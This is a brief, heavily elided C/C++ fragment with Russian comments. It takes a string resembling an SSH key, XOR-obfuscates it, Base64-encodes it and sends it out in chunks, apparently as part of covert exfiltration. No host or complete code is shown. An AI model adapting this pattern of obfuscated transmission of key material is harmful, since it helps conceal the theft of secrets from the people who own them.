...
int main() {
    ...
    // 5. Данные
    const char* raw_pqc = "ssh-rsa \r\nrsa-key-20260415";
    sz raw_len = strlen(raw_pqc);
    // 6. Обфускация: XOR
    u8* xored = xor_buf((const u8*)raw_pqc, raw_len, xor_key);
    // 7. Кодирование: Base64
    ...
    while (total_sent < full_request.length()) {
        ...
        if (total_sent + chunk > full_request.length())
            chunk = full_request.length() - total_sent;
